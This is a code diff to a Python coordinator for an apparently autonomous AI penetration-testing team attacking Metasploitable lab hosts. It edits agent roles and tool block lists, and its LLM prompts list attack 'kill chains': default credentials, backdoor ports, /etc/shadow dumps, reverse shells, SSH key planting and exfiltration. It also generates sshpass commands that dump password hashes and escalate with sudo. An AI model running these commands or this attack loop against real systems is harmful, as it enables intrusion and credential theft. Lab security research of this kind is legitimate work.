@@ -284,28 +284,28 @@ class SmartCoach:
         },
         "OrionAgent": {
             "role": "strategic",
-            "description": "🎯 Strategic Coordination - service analysis, comprehensive recon",
+            "description": "🎯 Strategic Coordination - vulnerability research, exploit selection",
             "primary_phases": [AttackPhase.ENUMERATION, AttackPhase.EXPLOITATION],
             "preferred_commands": [
-                # Phase 9.0: Orion is STRATEGIC ONLY — no direct exploitation commands.
-                # Removed: ssh_login, telnet_1524, mysql_root_login, samba_exploit,
-                #          vsftpd_exploit, psql_default_creds (belong to Red/Shadow)
-                "nmap_vuln_scan", "nmap_aggressive",
+                # Phase 42: Orion is STRATEGIC ANALYSIS ONLY — no scanning/recon.
+                # Removed: nmap_vuln_scan, nmap_aggressive (belong to Scout/Red).
+                # Orion researches vulns and suggests exploit paths, does NOT scan.
                 "searchsploit_search", "msfconsole_search",
-                # R47: Removed ldapsearch_base, bloodhound_collection, kerbrute,
-                # windapsearch — MS2 has no LDAP/AD, these waste 3+ actions per episode
             ],
             "command_tags": {"comprehensive", "analysis", "directory", "ldap", "vuln"},
-            # Phase 9.0: Orion must NEVER run exploitation/shell commands.
-            # "shell","ssh","backdoor","creds" blocks ssh_login, telnet_1524, psql_default_creds
-            # R42: Added post/post-exploit/credential/lateral/antiforensics/keylogger/ssh_keys/
-            # persistence/timestomp to prevent forced-novel from assigning post-exploit to Orion
+            # Phase 42: Added nmap, hydra, nikto, gobuster, ffuf, curl, wget, nc,
+            # dirb, wfuzz, enum4linux, smbclient, rpcclient to prevent overlap
+            # with Red/Scout/Shadow tools. Orion should ONLY do research.
             "avoid_tags": {"defense", "stealth", "scanning", "exploit", "bruteforce",
                            "shell", "ssh", "backdoor", "creds", "post", "post-exploit",
                            "credential", "lateral", "antiforensics", "keylogger",
-                           "ssh_keys", "persistence", "timestomp", "cleanup", "closeout"},
+                           "ssh_keys", "persistence", "timestomp", "cleanup", "closeout",
+                           "nmap", "hydra", "nikto", "gobuster", "ffuf", "dirb", "wfuzz",
+                           "enum4linux", "smbclient", "rpcclient", "nc", "curl", "wget",
+                           "recon", "access"},
             # Phase 8.2 Batch 14: Removed gobuster/ffuf/feroxbuster/dirsearch from Orion
-            "exclusive_prefixes": ["ldap", "bloodhound", "kerb", "burp", "windap"],
+            "exclusive_prefixes": ["ldap", "bloodhound", "kerb", "burp", "windap",
+                                   "searchsploit", "msfconsole"],
             "is_coordinator": True,
         },
         "ShadowAgent": {
@@ -1675,14 +1675,20 @@ class SmartCoach:
         if self.budget_controller is not None:
             _phase = step_ctx.attack_context.current_phase
             _pname = _phase.name if hasattr(_phase, 'name') else str(_phase)
-            if not self.budget_controller.can_call_mentor(_pname):
+            _stag = getattr(self, '_stagnation_steps', 0)
+            if not self.budget_controller.can_call_mentor(_pname, stagnation_steps=_stag):
                 logger.debug(f"[{self.agent_name}] Reasoning call suppressed by budget gate")
                 return None
         
         ctx = step_ctx.attack_context
         # Phase 38: State Integrity Gate — use discovery_board (ground truth)
         # instead of ctx.discoveries which may be stale/empty.
+        # Phase 42: Also check step_ctx.discovery_board directly (fallback chain).
         _disc_board_src = getattr(step_ctx, 'state', {}).get('discovery_board', {})
+        if not _disc_board_src:
+            _disc_board_src = getattr(step_ctx, 'discovery_board', {})
+        if not _disc_board_src:
+            _disc_board_src = getattr(ctx, 'discovery_board', {})
         _ports = list(_disc_board_src.get("ports", []))[:10] if _disc_board_src else (
             ctx.discoveries.get("ports", []) if isinstance(ctx.discoveries, dict) else []
         )
@@ -1703,8 +1709,10 @@ class SmartCoach:
             _plan_str = f"\nCurrent plan: {self._reasoning_plan[:100]}"
         
         # Phase 8.1: Team coordination context — what other agents found
+        # Phase 42 fix: reuse _disc_board_src (which has fallback chain)
+        # instead of only checking step_ctx.state.discovery_board
         _team_ctx = ""
-        _disc_board = getattr(step_ctx, 'state', {}).get('discovery_board', {})
+        _disc_board = _disc_board_src  # Use the variable with full fallback chain
         if _disc_board:
             _team_ports = list(_disc_board.get('ports', set()))[:10]
             _team_services = list(_disc_board.get('services', set()))[:5]
@@ -1743,28 +1751,50 @@ class SmartCoach:
                 f"\nLEARNED PATTERNS: {'; '.join(_pats)}"
             )
         
+        # Phase 42: Determine target profile for knowledge gating
+        _is_ms = ctx.target in ("172.28.0.10", "172.28.0.11") or "172.28.0" in ctx.target
+        _disc_creds_str = "unknown"
+        if ctx.state_flags.get('credentials_known'):
+            _disc_creds = getattr(ctx, 'credentials', None) or set()
+            if isinstance(_disc_creds, (set, list)) and _disc_creds:
+                _disc_creds_str = ", ".join(str(c) for c in list(_disc_creds)[:3])
+            elif _is_ms:
+                _disc_creds_str = "msfadmin:msfadmin"
+            else:
+                _disc_creds_str = "discovered"
+
+        _target_desc = "Metasploitable 3" if _is_ms else f"target {ctx.target}"
+        
         compact_prompt = (
             f"You are a senior penetration tester coordinating a team of 5 agents "
             f"(Red=offense, Scout=recon, Shadow=stealth, Blue=defense, Orion=strategy) "
-            f"attacking Metasploitable 3.\n"
+            f"attacking {_target_desc}.\n"
             f"Target: {ctx.target} | Phase: {ctx.current_phase.name} | "
             f"Ports: {', '.join(str(p) for p in list(_ports)[:10])} | "
             f"Services: {', '.join(str(s) for s in _services[:5])} | "
-            f"Creds: {'msfadmin:msfadmin' if ctx.state_flags.get('credentials_known') else 'unknown'} | "
+            f"Creds: {_disc_creds_str} | "
             f"Shell: {'YES' if ctx.state_flags.get('shell_obtained') else 'NO'} | "
             f"Root: {'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'} | "
             f"UserFlag: {'YES' if ctx.state_flags.get('user_flag_captured') else 'NO'} | "
             f"RootFlag: {'YES' if ctx.state_flags.get('root_flag_captured') else 'NO'}"
             f"{_team_ctx}{_failures_str}{_chain_str}{_plan_str}{_cognitive_ctx}{_output_learn_ctx}\n"
-            f"\nMS3 KILL CHAINS (proven paths — use these as attack playbooks):\n"
-            f"1. SSH chain: nmap -sV -p22→ssh_login msfadmin:msfadmin→sudo su→cat /root/root.txt→exfil /etc/shadow\n"
-            f"2. ProFTPD chain: nmap -sV -p21→ftp-anon→proftpd_exploit→reverse shell→sudo -l→privesc→cat flags→exfil\n"
-            f"3. Samba chain: enum4linux -a→samba_exploit 445→shell→dump /etc/shadow→credential harvest→exfil\n"
-            f"4. MySQL chain: mysql -h {ctx.target} -u root -psploitme→SELECT * FROM users→mysqldump→base64 exfil\n"
-            f"5. Ingreslock chain: telnet {ctx.target} 1524→instant root→cat /root/root.txt→cat /etc/shadow→exfil\n"
-            f"6. Tomcat chain: nmap -sV -p8180→default creds tomcat:tomcat→WAR deploy→reverse shell→privesc→flags\n"
-            f"7. VNC chain: vncviewer {ctx.target}:5900 password='password'→desktop access→terminal→sudo su→flags\n"
-            f"8. NFS chain: showmount -e {ctx.target}→mount -t nfs {ctx.target}:/ /mnt→plant SSH key→ssh root→flags\n"
+        )
+
+        # Only inject MS kill chains for Metasploitable targets
+        if _is_ms:
+            compact_prompt += (
+                f"\nMS3 KILL CHAINS (proven paths — use these as attack playbooks):\n"
+                f"1. SSH chain: nmap -sV -p22→ssh_login msfadmin:msfadmin→sudo su→cat /root/root.txt→exfil /etc/shadow\n"
+                f"2. ProFTPD chain: nmap -sV -p21→ftp-anon→proftpd_exploit→reverse shell→sudo -l→privesc→cat flags→exfil\n"
+                f"3. Samba chain: enum4linux -a→samba_exploit 445→shell→dump /etc/shadow→credential harvest→exfil\n"
+                f"4. MySQL chain: mysql -h {ctx.target} -u root -psploitme→SELECT * FROM users→mysqldump→base64 exfil\n"
+                f"5. Ingreslock chain: telnet {ctx.target} 1524→instant root→cat /root/root.txt→cat /etc/shadow→exfil\n"
+                f"6. Tomcat chain: nmap -sV -p8180→default creds tomcat:tomcat→WAR deploy→reverse shell→privesc→flags\n"
+                f"7. VNC chain: vncviewer {ctx.target}:5900 password='password'→desktop access→terminal→sudo su→flags\n"
+                f"8. NFS chain: showmount -e {ctx.target}→mount -t nfs {ctx.target}:/ /mnt→plant SSH key→ssh root→flags\n"
+            )
+
+        compact_prompt += (
             f"\nEXPLOIT REASONING — Think step-by-step like a senior pentester:\n"
             f"- RECONNAISSANCE: What services are running? What versions? What attack surface is exposed?\n"
             f"- VULNERABILITY MAPPING: WHY is this service vulnerable? (default creds, backdoor, misconfig, CVE, unpatched)\n"
@@ -1924,7 +1954,8 @@ class SmartCoach:
         # Phase 11.0: Centralized budget gate for codex meta calls
         if self.budget_controller is not None:
             _pname = current_phase.name if hasattr(current_phase, 'name') else str(current_phase)
-            if not self.budget_controller.can_call_mentor(_pname):
+            _stag = getattr(self, '_stagnation_steps', 0)
+            if not self.budget_controller.can_call_mentor(_pname, stagnation_steps=_stag):
                 logger.debug(f"[{self.agent_name}] Codex meta suppressed by budget gate")
                 return None
 
@@ -2094,14 +2125,14 @@ class SmartCoach:
         prompt = (
             f"TACTICAL STAGNATION ANALYSIS — Phase: {current_phase.name}\n"
             f"Trigger: {_trigger_reason}. Steps in phase: {self._codex_meta_phase_steps}.\n"
-            f"Target: {ctx.target} (Metasploitable 2/3 — Linux)\n"
+            f"Target: {ctx.target}\n"
             f"Coherence: {self._r66_coherence:.2f}  Macro confidence: {self._r66_macro_conf:.2f}\n"
             f"Reward velocity: {self._r67_velocity:.1f}  Stalling: {self._r67_stalling}\n"
             f"{_codex_ctx}\n"
             f"Current state:\n"
             f"- Ports discovered: {_ports}\n"
             f"- Services: {_services}\n"
-            f"- Credentials: {_creds if _creds else 'msfadmin:msfadmin (default)'}\n"
+            f"- Credentials: {_creds if _creds else 'none discovered yet'}\n"
             f"- Shells: {_shells}\n"
             f"- Flags: shell={'YES' if ctx.state_flags.get('shell_obtained') else 'NO'}, "
             f"root={'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}, "
@@ -2292,7 +2323,8 @@ class SmartCoach:
         # Phase 11.0: Centralized budget gate for codex strategic calls
         if self.budget_controller is not None:
             _pname = current_phase.name if hasattr(current_phase, 'name') else str(current_phase)
-            if not self.budget_controller.can_call_mentor(_pname):
+            _stag = getattr(self, '_stagnation_steps', 0)
+            if not self.budget_controller.can_call_mentor(_pname, stagnation_steps=_stag):
                 logger.debug(f"[{self.agent_name}] Codex strategic suppressed by budget gate")
                 return None
 
@@ -2389,11 +2421,11 @@ class SmartCoach:
         prompt = (
             f"STRATEGIC PLAN REPAIR — Episode step {step_num}, Phase: {current_phase.name}\n"
             f"Trigger: {_trigger}. Coherence: {_coherence:.2f}. Macro conf: {self._r66_macro_conf:.2f}\n"
-            f"Target: {ctx.target} (Metasploitable 2/3 — Linux)\n"
+            f"Target: {ctx.target}\n"
             f"{_codex_strat_ctx}\n"
             f"Current state:\n"
             f"- Ports: {_ports}\n- Services: {_services}\n"
-            f"- Credentials: {_creds if _creds else 'msfadmin:msfadmin (default)'}\n"
+            f"- Credentials: {_creds if _creds else 'none discovered yet'}\n"
             f"- Shells: {_shells}\n"
             f"- Flags: shell={'YES' if ctx.state_flags.get('shell_obtained') else 'NO'}, "
             f"root={'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}\n\n"
@@ -2930,7 +2962,8 @@ class SmartCoach:
         # =================================================================
         if should_call_gpt and self.budget_controller is not None:
             _phase_name = current_phase.name if hasattr(current_phase, 'name') else str(current_phase)
-            if not self.budget_controller.can_call_mentor(_phase_name):
+            _stag = getattr(self, '_stagnation_steps', 0)
+            if not self.budget_controller.can_call_mentor(_phase_name, stagnation_steps=_stag):
                 _pressure = self.budget_controller.get_pressure()
                 should_call_gpt = False
                 gpt_reason = f"budget_throttled(pressure={_pressure:.0%},phase={_phase_name})"
@@ -3663,6 +3696,13 @@ class SmartCoach:
                     _tc_state: Dict[str, Any] = dict(ctx.state_flags) if ctx.state_flags else {}
                     if ctx.target:
                         _tc_state["target"] = ctx.target
+                    # Build flags_set for TacticalCortex precondition check
+                    # TC expects state["flags_set"] as a set of flag names
+                    if "flags_set" not in _tc_state:
+                        _tc_state["flags_set"] = {
+                            k for k, v in (ctx.state_flags or {}).items()
+                            if v is True or v == 1
+                        }
                     
                     _tactical_assessment = self.tactical_cortex.assess(
                         command=result.command or "",
@@ -3796,23 +3836,45 @@ class SmartCoach:
             _escalation_attempt = getattr(self, '_escalation_attempt_count', 0)
             self._escalation_attempt_count = _escalation_attempt + 1
             
-            if _escalation_attempt % 2 == 0:
-                # Even: cat /etc/shadow → produces hash_dump discovery → hash_known flag
-                escalation_cmd = (
-                    f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no "
-                    f"-o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} "
-                    f"'cat /etc/shadow 2>/dev/null'"
-                )
-                _esc_type = "shadow_dump"
+            # Phase 42: Only use msfadmin creds for Metasploitable targets.
+            # For generic/HTB targets, use discovered credentials or generic privesc.
+            _is_ms_target = target in ("172.28.0.10", "172.28.0.11") or "172.28.0" in target
+            _disc_creds = getattr(ctx, 'credentials', None) or set()
+            _esc_user, _esc_pass = "", ""
+            if _is_ms_target:
+                _esc_user, _esc_pass = "msfadmin", "msfadmin"
+            elif isinstance(_disc_creds, (set, list)):
+                for _c in _disc_creds:
+                    if isinstance(_c, str) and ":" in _c:
+                        _esc_user, _esc_pass = _c.split(":", 1)
+                        break
+            
+            if _esc_user and _esc_pass:
+                if _escalation_attempt % 2 == 0:
+                    # Even: cat /etc/shadow → produces hash_dump discovery → hash_known flag
+                    escalation_cmd = (
+                        f"sshpass -p {_esc_pass} ssh -o StrictHostKeyChecking=no "
+                        f"-o HostKeyAlgorithms=+ssh-rsa {_esc_user}@{target} "
+                        f"'cat /etc/shadow 2>/dev/null'"
+                    )
+                    _esc_type = "shadow_dump"
+                else:
+                    # Odd: sshpass root attempt → produces root_shell if sudo works
+                    escalation_cmd = (
+                        f"pkill -f 'ssh.*{target}' 2>/dev/null; sleep 0.5; "
+                        f"sshpass -p {_esc_pass} ssh -o StrictHostKeyChecking=no "
+                        f"-o HostKeyAlgorithms=+ssh-rsa {_esc_user}@{target} "
+                        f"'echo {_esc_pass} | sudo -S id'"
+                    )
+                    _esc_type = "sshpass_root"
             else:
-                # Odd: sshpass root attempt → produces root_shell if sudo works
-                escalation_cmd = (
-                    f"pkill -f 'ssh.*{target}' 2>/dev/null; sleep 0.5; "
-                    f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no "
-                    f"-o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} "
-                    f"'echo msfadmin | sudo -S id'"
-                )
-                _esc_type = "sshpass_root"
+                # No credentials available — try generic privesc
+                if _escalation_attempt % 2 == 0:
+                    escalation_cmd = f"find / -perm -4000 -type f 2>/dev/null | head -20"
+                    _esc_type = "suid_search"
+                else:
+                    escalation_cmd = f"sudo -l 2>/dev/null"
+                    _esc_type = "sudo_check"
             
             result.command = escalation_cmd
             result.source = "privesc_escalation"
@@ -7363,6 +7425,16 @@ class SmartCoach:
             exfil_prompt: Optional exfil-specific prompt injection (from MentorController)
         """
         ctx = step_ctx.attack_context
+        
+        # Phase 42: Update SmartMentor target_profile to gate MS-specific knowledge
+        if self.smart_mentor:
+            _target = ctx.target
+            if _target in ("172.28.0.10",):
+                self.smart_mentor.target_profile = "metasploitable2"
+            elif _target in ("172.28.0.11",) or "172.28.0" in _target:
+                self.smart_mentor.target_profile = "metasploitable3"
+            else:
+                self.smart_mentor.target_profile = "generic"
         
         # Phase 6.2: Inject exfil guidance into context if provided
         if exfil_prompt:
